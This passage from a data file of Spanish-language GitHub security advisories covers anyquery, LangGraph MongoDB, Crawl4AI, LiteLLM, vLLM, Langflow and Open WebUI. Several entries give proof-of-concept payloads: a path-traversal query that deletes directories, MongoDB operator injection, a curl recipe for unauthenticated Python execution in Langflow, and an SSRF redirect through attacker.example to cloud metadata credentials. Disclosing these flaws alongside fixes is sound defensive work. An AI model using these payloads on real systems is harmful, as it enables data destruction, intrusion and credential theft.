+docker run --rm --name anyquery-vuln002 -p 127.0.0.1:8070:8070 anyquery-vuln002
+```
+
+**Paso 2: Ejecutar el script PoC (terminal separada):**
+
+```bash
+python3 poc.py
+```
+
+**Solicitud HTTP:**
+
+```http
+POST /execute-query HTTP/1.1
+Host: 127.0.0.1:8070
+Content-Type: application/json
+
+{""query"": ""SELECT clear_plugin_cache('../../../../tmp/poc_sentinel')""}
+```
+
+**Salida esperada:**
+
+```text
+[1] Creating sentinel directory /tmp/poc_sentinel inside container...
+    Sentinel created: /tmp/poc_sentinel
+[2] Confirming server is reachable...
+    GET /list-tables → HTTP 200 OK
+[3] Sending path-traversal payload via POST /execute-query...
+    HTTP 200
+    Body: +----------------------------------------------------+
+| clear_plugin_cache('../../../../tmp/poc_sentinel') |
++----------------------------------------------------+
+|                                                    |
++----------------------------------------------------+
+1 results
+[4] Checking whether sentinel was deleted inside container...
+    Sentinel GONE: /tmp/poc_sentinel deleted outside cache root.
+RESULT: PASS: clear_plugin_cache('../../../../tmp/poc_sentinel') deleted /tmp/poc_sentinel (outside /root/.cache/anyquery/plugins/)
+```
+
+## Impacto
+
+Un usuario de API autenticado con bajos privilegios puede eliminar cualquier directorio accesible al proceso del servidor anyquery proporcionando un nombre de plugin que atraviese rutas con `..` a `clear_plugin_cache`. El impacto verificado es la eliminación permanente de directorios arbitrarios fuera del límite previsto del cache de plugins (`$XDG_CACHE_HOME/anyquery/plugins/`). En un despliegue realista, un atacante podría dirigirse a directorios de configuración, datos de aplicación o el directorio home del usuario, causando pérdida irreversible de datos y denegación de servicio. No hay impacto en la confidencialidad ya que la función solo elimina y no lee datos.
+
+## Remediación
+
+En `namespace/other_functions.go`, resolver la ruta completa y confirmar que comparte el prefijo esperado de la raíz del cache antes de llamar a `os.RemoveAll`:
+
+```go
+func clear_plugin_cache(plugin string) string {
+    if plugin == """" {
+        return ""The plugin name is empty""
+    }
+    cacheRoot := pathlib.Join(xdg.CacheHome, ""anyquery"", ""plugins"")
+    pathToRemove := pathlib.Join(cacheRoot, plugin)
+    rel, err := filepath.Rel(cacheRoot, pathToRemove)
+    if err != nil || strings.HasPrefix(rel, "".."") || rel == "".."" {
+        return ""Invalid plugin name""
+    }
+    if err := os.RemoveAll(pathToRemove); err != nil {
+        return err.Error()
+    }
+    return """"
+}
+```
+
+Como medida de defensa en profundidad, también rechazar valores de `plugin` que contengan `/`, `\`, o un `.` inicial a nivel de entrada antes de la llamada `path.Join`, para que las secuencias de traversal sean bloqueadas en la primera oportunidad.","HIGH","7.3","3.1","CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:H","Network","Low","Low","Required","Unchanged","None","High","High","CWE-22","Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","go","github.com/julien040/anyquery","<= 0.4.4","0.4.5","Security","Security Advisory","Advisory","2026-06-10","2026-06-10T20:25:03.301Z","232-323","https://github.com/julien040/anyquery/security/advisories/GHSA-j9rx-rppg-6hh4;https://github.com/julien040/anyquery/releases/tag/0.4.5;https://github.com/advisories/GHSA-j9rx-rppg-6hh4","XX","0","0","julien040"
+"GHSA-98xf-r82g-9mhx","CVE-2026-48121","inyeccion-nosql-mongodbsaver-langgraph-permite-acceso-crosstenant-estados","https://github.com/advisories/GHSA-98xf-r82g-9mhx","Inyección NoSQL en MongoDBSaver de LangGraph permite acceso cross-tenant a estados","Vulnerabilidad de inyección NoSQL en MongoDBSaver de LangGraph que permite a atacantes acceder a checkpoints de otros tenants mediante operadores MongoDB maliciosos en identificadores de configuración.","## Resumen
+
+Existía una vulnerabilidad de inyección NoSQL en `MongoDBSaver` donde los campos identificadores de checkpoint de `config.configurable` se utilizaban en consultas MongoDB sin validación estricta de tipos. En versiones vulnerables, payloads de objetos controlados por atacantes (por ejemplo, operadores MongoDB como `$gt` y `$ne`) podían interpretarse como operadores de consulta en lugar de valores literales de identificador.
+
+Esto podía eludir el alcance previsto de hilos y devolver checkpoints de otros tenants.
+
+## Superficie de ataque
+
+La ruta vulnerable estaba en `MongoDBSaver.getTuple()`, donde `thread_id`, `checkpoint_ns` y `checkpoint_id` se utilizaban en consultas `find()` de MongoDB. Los mismos valores no validados se reutilizaban posteriormente para obtener escrituras pendientes.
+
+Las aplicaciones quedaban expuestas cuando entrada no confiable se reenviaba a `config.configurable` (por ejemplo, directamente desde cuerpos de petición o parámetros de consulta) sin coerción de cadenas o validación de esquema.
+
+## Quién se ve afectado
+
+Las aplicaciones son vulnerables si:
+
+- Utilizan `@langchain/langgraph-checkpoint-mongodb` con modelos de hilos multi-tenant o aislados por usuario
+- Aceptan valores controlados por usuario para `thread_id`, `checkpoint_ns` o `checkpoint_id`
+- Pasan esos valores a `app.invoke()`, `app.stream()` o métodos directos del saver sin validación
+
+Las aplicaciones generalmente no son vulnerables si:
+
+- Utilizan únicamente identificadores emitidos por el servidor
+- Obtienen `thread_id` de parámetros URL confiables que permanecen como cadenas
+- Aplican validación de esquema que rechaza campos identificadores que no sean cadenas
+
+## Impacto
+
+Un atacante con control sobre identificadores de checkpoint configurables podía leer datos de checkpoint fuera de su límite de hilo autorizado.
+
+Los datos potencialmente expuestos incluyen:
+
+- Estado de checkpoint
+- Metadatos
+- Escrituras pendientes
+
+Este es un problema de confidencialidad con riesgo de divulgación de datos cross-tenant.
+
+## Ejemplo de explotación
+
+Una petición controlada por atacante puede inyectar operadores MongoDB:
+
+```typescript
+graph = new StateGraph(...)
+  .compile({
+    checkpointer: new MongoDBSaver()
+  });
+
+graph.invoke(..., {
+  configurable: {  
+    ""thread_id"": { ""$gt"": """" },
+    ""checkpoint_ns"": { ""$ne"": null }
+  }
+});
+```
+
+Si este payload se reenvía a `config.configurable`, la consulta resultante puede coincidir con checkpoints fuera del alcance previsto de tenant/hilo.
+
+## Cambios de endurecimiento de seguridad
+
+La versión `1.3.1` endurece `@langchain/langgraph-checkpoint-mongodb` añadiendo validación en tiempo de ejecución para identificadores de checkpoint configurables y rechazando valores inválidos antes de que se ejecuten las rutas de consulta/escritura de MongoDB.
+
+El parche también incluye pruebas de regresión que cubren payloads de objeto/operador en todos los métodos afectados.
+
+## Guía de migración
+
+Actualice a `@langchain/langgraph-checkpoint-mongodb@1.3.1` o posterior.
+
+No se requiere migración de API para llamadores válidos. Sin embargo, las aplicaciones que actualmente pasan valores identificadores que no son cadenas en `config.configurable` ahora recibirán errores explícitos y deberían normalizar/validar las entradas.
+
+Como defensa en profundidad, valide campos identificadores en límites de API y evite pasar objetos cliente sin procesar a la configuración del grafo.
+
+## Recursos
+
+- Issue: https://github.com/langchain-ai/langgraphjs/issues/2351
+- Fix PR: https://github.com/langchain-ai/langgraphjs/pull/2397","MEDIUM","6.7","3.1","CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N","Adjacent","Low","Low","Required","Unchanged","High","High","None","CWE-943","Improper Neutralization of Special Elements in Data Query Logic","npm","@langchain/langgraph-checkpoint-mongodb","<= 1.3.0","1.3.1","Security","Security Advisory","Advisory","2026-06-12","2026-06-14T21:44:44.904Z","Nagendhra-web, etairl, hntrl","https://github.com/langchain-ai/langgraphjs/security/advisories/GHSA-98xf-r82g-9mhx;https://github.com/langchain-ai/langgraphjs/issues/2351;https://github.com/langchain-ai/langgraphjs/pull/2397;https://github.com/langchain-ai/langgraphjs/commit/284226c7ca164b3c81fe2d9e32b10f1fc6b99a3c;https://github.com/advisories/GHSA-98xf-r82g-9mhx","US","0","0","LangChain"
+"GHSA-365w-hqf6-vxfg","GHSA-365w-hqf6-vxfg","crawl4ai-multiples-vulnerabilidades-docker-api-afectan-escritura-archivos","https://github.com/advisories/GHSA-365w-hqf6-vxfg","Crawl4AI: múltiples vulnerabilidades en Docker API afectan escritura de archivos, SSRF, XSS y autenticación","El servidor Docker API de Crawl4AI presenta siete vulnerabilidades críticas: escritura arbitraria de archivos (CVSS 9.1), SSRF en webhooks y endpoints de crawling (CVSS 8.6), bypass de autenticación en monitor (CVSS 6.5), XSS almacenado (CVSS 6.1), ejecución arbitraria de JavaScript (CVSS 8.1) y clave JWT hardcodeada (CVSS 9.8).","## Resumen
+
+Se han identificado múltiples vulnerabilidades de seguridad en el servidor Docker API de Crawl4AI que afectan a los endpoints de crawling, extracción markdown/IA, capturas de pantalla, PDFs, webhooks, monitorización, ejecución de JavaScript y configuración.
+
+## Vulnerabilidades
+
+### 1. Escritura arbitraria de archivos mediante /screenshot y /pdf (CWE-22, CVSS 9.1)
+
+El parámetro `output_path` acepta rutas arbitrarias del sistema de archivos sin ningún tipo de validación. Un atacante puede sobreescribir archivos del servidor (DoS) o escribir en cualquier ubicación con permisos de escritura para el usuario `appuser`.
+
+**Corrección aplicada:** Se añadió la función `validate_output_path()` que restringe las escrituras al directorio `CRAWL4AI_OUTPUT_DIR` (por defecto `/tmp/crawl4ai-outputs`). Se incorporó un validador de campo Pydantic (`field_validator`) que rechaza secuencias de traversal `..`.
+
+### 2. SSRF mediante URL de webhook (CWE-918, CVSS 8.6)
+
+Las URLs de webhook en los endpoints `/crawl/job` y `/llm/job` aceptan IPs internas o privadas sin validación alguna, lo que permite realizar ataques de Server-Side Request Forgery contra endpoints de metadatos cloud (169.254.169.254), servicios internos y redes Docker.
+
+**Corrección aplicada:** Se añadió la función `validate_webhook_url()` con una lista de bloqueo para rangos RFC 1918, loopback, link-local, IPs y nombres de host de metadatos cloud. La validación se aplica tanto en el momento de envío del trabajo como en el momento del envío de la petición. Se configuró explícitamente `follow_redirects=False`.
+
+### 3. Bypass de autenticación en endpoints de monitorización (CWE-306, CVSS 6.5)
+
+El router de monitorización fue montado sin la dependencia `token_dep`, lo que dejaba todos los endpoints de monitorización (incluidos los destructivos como `/monitor/actions/cleanup`) accesibles sin autenticación.
+
+**Corrección aplicada:** Se añadió `dependencies=[Depends(token_dep)]` al router de monitorización. Se incorporó una verificación explícita de token en el endpoint WebSocket `/monitor/ws`.
+
+### 4. XSS almacenado en el panel de monitorización (CWE-79, CVSS 6.1)
+
+Las URLs y mensajes de error renderizados en el panel de monitorización se inyectaban mediante `innerHTML` sin escapado previo, lo que permitía XSS almacenado a través de URLs de crawling manipuladas.
+
+**Corrección aplicada:** Se aplicó `html.escape()` en el lado del servidor para el almacenamiento de URLs y errores. Se añadió la función `escapeHtml()` en el lado del cliente para todas las inyecciones de plantilla mediante `innerHTML`.
+
+### 5. Ejecución arbitraria de JavaScript mediante /execute_js (CWE-94, CVSS 8.1)
+
+El endpoint `/execute_js` acepta y ejecuta JavaScript arbitrario en el navegador del servidor con la opción `--disable-web-security` habilitada, combinando ejecución arbitraria de código con capacidad de SSRF.
+
+**Corrección aplicada:** El endpoint queda deshabilitado por defecto mediante la variable de entorno `CRAWL4AI_EXECUTE_JS_ENABLED`. Se añadió la lista de bloqueo SSRF sobre la URL de destino. Se eliminó `--disable-web-security` de los argumentos por defecto del navegador.
+
+### 6. Clave secreta JWT hardcodeada (CWE-798, CVSS 9.8)
+
+La clave de firma JWT tiene como valor por defecto `""mysecret""` en el código fuente público, lo que permite a cualquier persona forjar tokens de autenticación válidos.
+
+**Corrección aplicada:** Se eliminó el valor por defecto. Se añadió validación en el arranque que rechaza secretos débiles o demasiado cortos. Se genera automáticamente una clave efímera cuando JWT está habilitado pero no se ha configurado ninguna clave.
+
+### 7. SSRF en endpoints de crawling directo /crawl, /md, /llm (CWE-918, CVSS 8.6)
+
+Los puntos de entrada principales de crawling (`/crawl`, `/crawl/stream`, `/md`, `/llm`) recuperan URLs arbitrarias proporcionadas por el usuario sin validación del destino, lo que permite SSRF contra servicios internos, redes Docker y endpoints de metadatos cloud (169.254.169.254).
+
+Además, una lista de bloqueo que solo inspeccionaba el nombre de host literal era bypassable mediante direcciones IPv4 mapeadas a IPv6 (por ejemplo, `[::ffff:169.254.169.254]` o `[::ffff:10.0.0.1]`), que resuelven a rangos privados o de metadatos bloqueados pero evaden una comprobación de cadena ingenua.
+
+**Corrección aplicada:** Se añadió validación del destino URL en todos los puntos de entrada de crawling, markdown y IA, reutilizando la lista de bloqueo SSRF (RFC 1918, loopback, link-local, IPs y nombres de host de metadatos cloud). Las direcciones IPv4 mapeadas a IPv6 se normalizan a su forma IPv4 antes de la comprobación, cerrando el bypass por mapeo. Las URLs con esquema `raw://` se omiten. La validación se aplica en la entrada de la petición, no únicamente en el momento de la recuperación.
+
+## Mitigaciones y soluciones alternativas
+
+1. Actualizar a la versión parcheada (recomendado).
+2. Configurar `CRAWL4AI_API_TOKEN` para habilitar la autenticación.
+3. Establecer un valor fuerte para `SECRET_KEY` (mínimo 32 caracteres) si se utiliza JWT.
+4. Restringir el acceso de red al Docker API.
+
+## Créditos
+
+Las vulnerabilidades fueron reportadas por los siguientes investigadores:
+
+- **Jeongbean Jeon**: escritura de archivos, SSRF, bypass de autenticación en monitor, XSS almacenado.
+- **wulonchia**: escritura de archivos mediante `output_path` (reporte independiente).
+- **by111 (August829)**: JWT hardcodeado, eval en `/config/dump`, `/execute_js`, escape del sandbox de hooks.
+- **secsys_codex**: SSRF en endpoints `/md`, `/crawl`, `/llm` y bypass mediante IPv4 mapeado a IPv6 (validación de destino URL).
+- **Velayutham Selvaraj**: SSRF por ausencia de validación de host en `validate_url_scheme` (reporte independiente).
+- **IcySun y Yashon**: SSRF, escritura arbitraria de archivos, ausencia de autenticación por defecto, bypass del sandbox de hooks mediante asyncio (reporte independiente).","CRITICAL","9.8","3.1","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Network","Low","None","None","Unchanged","High","High","High","CWE-22","Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","pip","crawl4ai","<= 0.8.6","0.8.7","Security","Security Advisory","Advisory","2026-06-16","2026-06-17T00:51:17.898Z","August829","https://github.com/unclecode/crawl4ai/security/advisories/GHSA-365w-hqf6-vxfg;https://github.com/advisories/GHSA-365w-hqf6-vxfg","XX","0","0","crawl4ai"
+"GHSA-4xpc-pv4p-pm3w","CVE-2026-49468","omision-autenticacion-inyeccion-cabecera-host-litellm-proxy","https://github.com/advisories/GHSA-4xpc-pv4p-pm3w","Omisión de autenticación por inyección de cabecera Host en LiteLLM proxy","Un fallo en el análisis de la cabecera Host en LiteLLM proxy permite, bajo condiciones específicas, acceso no autenticado a rutas de gestión protegidas. Corregido en la versión 1.84.0. Las implementaciones con CDN, WAF o proxy inverso no se ven afectadas.","## Omisión de autenticación por inyección de cabecera Host en LiteLLM
+
+Se ha identificado un fallo en el análisis de la cabecera `Host` en el proxy de LiteLLM que podría permitir, bajo condiciones específicas, acceso no autenticado a rutas de gestión protegidas.
+
+## Descripción técnica
+
+La capa de autenticación del proxy derivaba la ruta efectiva a partir de `request.url.path` en el archivo `litellm/proxy/auth/auth_utils.py`, concretamente en la función `get_request_route()`. Starlette reconstruye esta ruta a partir de la cabecera `Host`. Por tanto, una cabecera `Host` manipulada podría hacer que el mecanismo de autenticación evaluara una ruta diferente a la que FastAPI había despachado realmente.
+
+Esto significa que un atacante no autenticado podría, en determinadas circunstancias, engañar al sistema de control de acceso para que omita la verificación de autenticación en rutas de administración sensibles, accediendo a funcionalidades que deberían estar restringidas.
+
+## Impacto
+
+La mayoría de los despliegues no se ven afectados. El bypass queda bloqueado por cualquier capa upstream que valide o normalice la cabecera `Host`, como por ejemplo:
+
+- Una CDN o WAF, como Cloudflare
+- Un proxy inverso con listas de permitidos mediante `server_name`
+- Un balanceador de carga basado en host
+
+Los clientes de LiteLLM Cloud tampoco se ven afectados.
+
+## Versiones afectadas y solución
+
+El problema ha sido corregido en la versión `1.84.0`. Se recomienda actualizar a `1.84.0` o posterior. No se requiere ningún cambio de configuración adicional.
+
+## Mitigaciones alternativas
+
+Si la actualización inmediata no es posible, se recomienda situar el proxy detrás de un componente upstream que valide o normalice la cabecera `Host` antes de reenviar las peticiones. Las opciones válidas incluyen:
+
+- Una CDN o WAF
+- Un proxy inverso con listas de permitidos explícitas mediante `server_name`
+- Un balanceador de carga en la nube con reglas de enrutamiento basadas en host
+
+Alternativamente, se puede restringir el acceso de red al listener del proxy para limitar la superficie de exposición.
+
+## Referencias
+
+- Versión con el parche aplicado: `v1.84.0` disponible en el repositorio oficial de BerriAI en GitHub.
+
+**Créditos de descubrimiento**: Le The Thang (KCSC) y Kim Ngoc Chung (One Mount Group).","CRITICAL","","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","CWE-290","Authentication Bypass by Spoofing","pip","litellm","< 1.84.0","1.84.0","Security","Security Advisory","Advisory","2026-06-16","2026-06-17T01:29:53.991Z","LilThawg29","https://github.com/BerriAI/litellm/security/advisories/GHSA-4xpc-pv4p-pm3w;https://github.com/BerriAI/litellm/releases/tag/v1.84.0;https://github.com/advisories/GHSA-4xpc-pv4p-pm3w","US","37.77","-122.42","BerriAI"
+"GHSA-94f4-hr76-p5j6","CVE-2026-48746","vllm-omision-autenticacion-authenticationmiddleware-api-openai","https://github.com/advisories/GHSA-94f4-hr76-p5j6","vLLM: omisión de autenticación en AuthenticationMiddleware de la API OpenAI","Una vulnerabilidad en vLLM permite eludir la autenticación de la API OpenAI manipulando la cabecera Host con caracteres especiales. Afecta a instancias que usan VLLM_API_KEY expuestas directamente sin proxy RFC-conforme como nginx.","## Descripción general
+
+Se ha identificado una vulnerabilidad en vLLM que permite eludir el mecanismo de autenticación del middleware `AuthenticationMiddleware` de la API OpenAI. El hallazgo fue realizado durante una auditoría de código fuente llevada a cabo por x41sec. La explotación permite utilizar la API sin proporcionar la clave configurada mediante `VLLM_API_KEY` o el parámetro `--api-key`.
+
+## Detalles técnicos
+
+El problema reside en la forma en que vLLM extrae la ruta de la URL dentro del middleware de autenticación. En el archivo `vllm/entrypoints/openai/api_server.py`, la variable `url_path` se obtiene a partir del objeto `URL` reconstruido por starlette basándose en el `scope` de la solicitud entrante:
+
+```python
+from starlette.datastructures import URL, Headers, MutableHeaders, State
+
+# ...
+
+url_path = URL(scope=scope).path.removeprefix(root_path)
+headers = Headers(scope=scope)
+if url_path.startswith(""/v1"") and not self.verify_token(headers):
+    response = JSONResponse(content={""error"": ""Unauthorized""}, status_code=401)
+    return response(scope, receive, send)
+return self.app(scope, receive, send)
+```
+
+El `scope` de la solicitud incluye la cabecera `Host:` del cliente, y starlette reconstruye la URL completa con el siguiente patrón:
+
+```python
+f""{scheme}://{host_header}{path}""
+```
+
+Ni starlette ni ninguno de los servidores ASGI disponibles, incluyendo uvicorn (que es el servidor utilizado por vLLM), filtran correctamente la cabecera `Host:` para detectar caracteres inválidos. Esto permite a un atacante inyectar caracteres especiales de URL como `/` o `?` dentro de la cabecera `Host:`, logrando así controlar la URL reconstruida y, en particular, el valor del atributo `.path` resultante.
+
+El enrutamiento de FastAPI y starlette opera sobre la ruta HTTP real de la solicitud y no depende del atributo `.path` parseado a partir de la URL reconstruida. Esto crea una discrepancia: un atacante puede alcanzar un endpoint mediante una ruta determinada mientras presenta un valor diferente en el atributo `.path`, engañando al middleware de autenticación para que no aplique la verificación del token.
+
+## Impacto
+
+La vulnerabilidad afecta a las siguientes configuraciones:
+
+- Instancias de vLLM que utilizan una clave de API (`VLLM_API_KEY` o `--api-key`) para proteger la API OpenAI y que exponen dicha API directamente a potenciales atacantes.
+
+Las instancias que se encuentran detrás de un servidor web conforme con el RFC, como nginx, **no** se ven afectadas, ya que estos servidores filtran correctamente las cabeceras `Host:` malformadas antes de que la solicitud llegue a vLLM.
+
+## Contexto y relevancia
+
+Esta vulnerabilidad es especialmente crítica en entornos donde vLLM se despliega directamente expuesto a redes no confiables sin un proxy inverso intermedio. Un atacante que explote este fallo puede acceder libremente a los modelos de IA servidos por vLLM, incurriendo en costes computacionales no autorizados, extrayendo información procesada por el modelo o abusando de la infraestructura para otros fines maliciosos. La raíz del problema combina una confianza implícita en datos controlables por el cliente dentro de starlette y la ausencia de validación de la cabecera `Host:` en los servidores ASGI.","CRITICAL","9.1","3.1","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H","Network","Low","None","None","Unchanged","High","None","High","CWE-444","Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')","pip","vllm",">= 0.3.0, < 0.22.0","0.22.0","Security","Security Advisory","Advisory","2026-06-16","2026-06-17T01:36:46.179Z","x41j, russellb, DarkLight1337","https://github.com/vllm-project/vllm/security/advisories/GHSA-94f4-hr76-p5j6;https://github.com/vllm-project/vllm/pull/43426;https://x41-dsec.de/lab/advisories/x41-2026-002-starlette;https://github.com/advisories/GHSA-94f4-hr76-p5j6","US","0","0","vllm-project"
+"GHSA-v5ff-9q35-q26f","CVE-2026-48519","rce-autenticado-shareable-playground-langflow-afecta-cualquier-despliegue","https://github.com/advisories/GHSA-v5ff-9q35-q26f","RCE no autenticado en Shareable Playground de Langflow afecta cualquier despliegue público","Langflow presenta una vulnerabilidad crítica de RCE en su función Shareable Playground. Cualquier usuario no autenticado puede inyectar código Python arbitrario en el payload JSON al ejecutar flujos públicos mediante la ruta /api/v1/build_public_tmp, comprometiendo completamente el servidor.","## Descripción general
+
+Langflow presenta una vulnerabilidad crítica de ejecución remota de código (RCE) en su funcionalidad denominada Shareable Playground (conocida internamente como Public Flows). El simple hecho de compartir un flujo expone el despliegue completo a RCE por parte de usuarios no autenticados. La vulnerabilidad fue verificada sobre el commit `2d67402b1dbaefcbce85a244d4a6cd5e4bda1cfe`.
+
+## Detalles técnicos
+
+La funcionalidad Shareable Playground permite la ejecución de flujos de trabajo por parte de usuarios no autenticados mediante el acceso a un enlace público. Concretamente, habilita la ruta `/api/v1/build_public_tmp` para ejecutar cualquier flujo público dado su identificador.
+
+El problema crítico reside en que, al ejecutar el flujo, la ruta permite proporcionar código Python arbitrario como código de nodo dentro del payload JSON de la petición. El campo vulnerable es:
+
+```
+data.nodes[X].data.node.template.code.value
+```
+
+Esto significa que un atacante puede sustituir el código legítimo del nodo por cualquier código Python malicioso, el cual será ejecutado directamente en el servidor sin ningún tipo de validación ni restricción de autenticación.
+
+## Prueba de concepto (PoC)
+
+Pasos para reproducir la vulnerabilidad:
+
+1. Crear un nuevo flujo y añadir un nodo Chat Input.
+2. Compartir el flujo mediante la opción Shareable Playground.
+3. Acceder al enlace público con las herramientas de desarrollo del navegador abiertas y ejecutar el flujo.
+4. Localizar la ruta `/api/v1/build_public_tmp` y copiarla como comando cURL.
+5. Editar el campo JSON `data.nodes[X].data.node.template.code.value` con cualquier código Python y ejecutar el comando cURL.
+
+Ejemplo de PoC (sustituir el ID del flujo por el correcto):
+
+```bash
+curl 'http://localhost:7860/api/v1/build_public_tmp/<flow-id>/flow?start_component_id=ChatInput-syEJp&log_builds=false&event_delivery=streaming' \
+  -H 'Content-Type: application/json' \
+  -b 'client_id=anything' \
+  --data-raw ""$(cat test_with_python.json)""
+```
+
+Buscar `touch /tmp/pwned` en el archivo `test_with_python.json` y reemplazarlo por cualquier otro código Python para verificar la ejecución arbitraria en el servidor.
+
+## Traza de ejecución
+
+La traza del stack correspondiente al código ejecutado es la siguiente:
+
+```
+File "".../langflow/api/build.py"", line 495, in generate_flow_events
+    ids, vertices_to_run, graph = await build_graph_and_get_order()
+File "".../langflow/api/build.py"", line 234, in build_graph_and_get_order
+    graph = await create_graph(fresh_session, flow_id_str, flow_name)
+File "".../langflow/api/build.py"", line 298, in create_graph
+    return await build_graph_from_data(...)
+File "".../langflow/api/utils/core.py"", line 192, in build_graph_from_data
+    graph = Graph.from_payload(payload, str_flow_id, flow_name, kwargs.get(""user_id""))
+File "".../lfx/graph/graph/base.py"", line 1153, in from_payload
+    graph.add_nodes_and_edges(vertices, edges)
+File "".../lfx/graph/graph/base.py"", line 270, in add_nodes_and_edges
+    self.initialize()
+File "".../lfx/graph/graph/base.py"", line 512, in initialize
+    self._build_graph()
+File "".../lfx/graph/graph/base.py"", line 1305, in _build_graph
+    self._instantiate_components_in_vertices()
+File "".../lfx/graph/graph/base.py"", line 1347, in _instantiate_components_in_vertices
+    vertex.instantiate_component(self.user_id)
+File "".../lfx/graph/vertex/base.py"", line 382, in instantiate_component
+    self.custom_component, _ = initialize.loading.instantiate_class(...)
+File "".../lfx/interface/initialize/loading.py"", line 45, in instantiate_class
+    custom_component: CustomComponent | Component = class_object(...)
+File ""<string>"", line 59, in __init__
+```
+
+## Impacto
+
+Cualquier despliegue de Langflow que tenga al menos un flujo compartido mediante la funcionalidad Shareable Playground queda expuesto a RCE no autenticado. Un atacante sin credenciales puede ejecutar código Python arbitrario en el servidor, lo que puede derivar en compromiso total del sistema, exfiltración de datos, movimiento lateral en la infraestructura o destrucción de recursos.
+
+La vulnerabilidad fue descubierta e informada por Ori Lahav, investigador de seguridad en Rubrik Inc.","CRITICAL","9.6","3.1","CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H","Network","Low","None","Required","Changed","High","High","High","CWE-94","Improper Control of Generation of Code ('Code Injection')","pip","langflow","<= 1.9.1","1.9.2","Security","Security Advisory","Advisory","2026-06-16","2026-06-17T17:41:53.264Z","vbCrLf, Jkavia, andifilhohub, AntonioABLima","https://github.com/langflow-ai/langflow/security/advisories/GHSA-v5ff-9q35-q26f;https://github.com/advisories/GHSA-v5ff-9q35-q26f","US","0","0","Langflow"
+"GHSA-226f-f24g-524w","CVE-2026-54008","ssrf-bypass-redireccion-oauth-processpictureurl-afecta-open-webui","https://github.com/advisories/GHSA-226f-f24g-524w","SSRF por bypass de redirección en OAuth _process_picture_url afecta a Open WebUI hasta v0.9.5","Open WebUI hasta v0.9.5 permite SSRF de lectura completa en _process_picture_url: valida la URL inicial pero sigue redirecciones 302 sin revalidar, exponiendo servicios internos a atacantes con identidad OAuth válida. Variante no parcheada de CVE-2026-45401.","## Resumen
+
+La función `_process_picture_url` ubicada en `backend/open_webui/utils/oauth.py` (v0.9.5, líneas 1435-1470) invoca `validate_url(picture_url)` únicamente sobre la URL inicial y, a continuación, llama a `aiohttp.ClientSession.get(picture_url, ...)` sin especificar `allow_redirects=False`. El comportamiento por defecto de aiohttp es `allow_redirects=True, max_redirects=10`. Además, la función no utiliza la constante de entorno `AIOHTTP_CLIENT_ALLOW_REDIRECTS` definida en el proyecto. Un atacante con una identidad válida en el proveedor OAuth (IdP) puede, por tanto, enviar una URL pública que responda con una redirección 302 hacia una dirección interna y leer el cuerpo de la respuesta interna a través del campo `profile_image_url` de su propia cuenta.
+
+Esta vulnerabilidad pertenece a la misma clase de bypass por redirección que CVE-2026-45401 (GHSA-rh5x-h6pp-cjj6), pero corresponde a un sexto punto de llamada que el parche de v0.9.5 no contempló. El aviso de CVE-2026-45401 enumera exactamente cinco rutas afectadas: `SafeWebBaseLoader._scrape`, `_fetch`, `get_content_from_url`, `load_url_image` y `get_image_base64_from_url`, ninguna de ellas en `utils/oauth.py`.
+
+## Código vulnerable (v0.9.5)
+
+Archivo `backend/open_webui/utils/oauth.py`, líneas 1435-1470:
+
+```python
+async def _process_picture_url(self, picture_url: str, access_token: str = None) -> str:
+    if not picture_url:
+        return '/user.png'
+    try:
+        validate_url(picture_url)                              # solo la URL inicial
+
+        get_kwargs = {}
+        if access_token:
+            get_kwargs['headers'] = {'Authorization': f'Bearer {access_token}'}
+        async with aiohttp.ClientSession(trust_env=True) as session:
+            async with session.get(picture_url, **get_kwargs,
+                                   ssl=AIOHTTP_CLIENT_SESSION_SSL) as resp:
+            #                       ^^^^^^^^^^^ sin allow_redirects=False
+                if resp.ok:
+                    picture = await resp.read()
+                    base64_encoded_picture = base64.b64encode(picture).decode('utf-8')
+                    guessed_mime_type = mimetypes.guess_type(picture_url)[0]
+                    if guessed_mime_type is None:
+                        guessed_mime_type = 'image/jpeg'
+                    return f'data:{guessed_mime_type};base64,{base64_encoded_picture}'
+                ...
+```
+
+La función se invoca en `oauth.py:1556` (registro de nuevo usuario vía OAuth) y en `oauth.py:1536` (actualización de imagen de perfil en inicio de sesión de usuario existente). Ninguno de los dos puntos de llamada revalida la URL tras seguir la redirección.
+
+El archivo `backend/open_webui/retrieval/web/utils.py` (v0.9.5) importa la constante de entorno `AIOHTTP_CLIENT_ALLOW_REDIRECTS` en la línea 51 y la utiliza en las cinco rutas parcheadas por CVE-2026-45401. El archivo `utils/oauth.py` no la importa ni la referencia.
+
+## Explotación
+
+**Condiciones previas:**
+- `ENABLE_OAUTH_SIGNUP=true` o `OAUTH_UPDATE_PICTURE_ON_LOGIN=true` (configuración habitual en despliegues de producción con OAuth-IdP)
+- El atacante dispone de una identidad válida en el IdP OAuth configurado (Google, Microsoft, GitHub o cualquier proveedor OIDC genérico)
+
+**Pasos:**
+
+1. El atacante aloja un endpoint de redirección en `http://attacker.example/r` sobre una IP pública. `validate_url(""http://attacker.example/r"")` devuelve True (`is_global=True` para IPs públicas).
+2. El atacante establece el claim `picture` de su IdP como `http://attacker.example/r`.
+3. El atacante inicia sesión en Open WebUI mediante OAuth. Open WebUI invoca `_process_picture_url(""http://attacker.example/r"", ...)`.
+4. `validate_url` acepta la URL pública. Se invoca `session.get(""http://attacker.example/r"")`.
+5. `attacker.example` responde con `HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:11434/api/tags` (o `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, servicios internos RFC1918, etc.).
+6. aiohttp sigue la redirección en el lado del servidor. No se realiza ninguna revalidación.
+7. El cuerpo de la respuesta interna se lee en `picture`, se codifica en base64 y se almacena como `profile_image_url = ""data:image/jpeg;base64,...""` en la cuenta del atacante.
+8. El atacante recupera el valor mediante `GET /api/v1/auths/`. Al decodificar el payload en base64 se obtiene el cuerpo completo de la respuesta interna.
+
+## Impacto
+
+SSRF de lectura completa, con el mismo mecanismo de lectura que CVE-2026-45338:
+
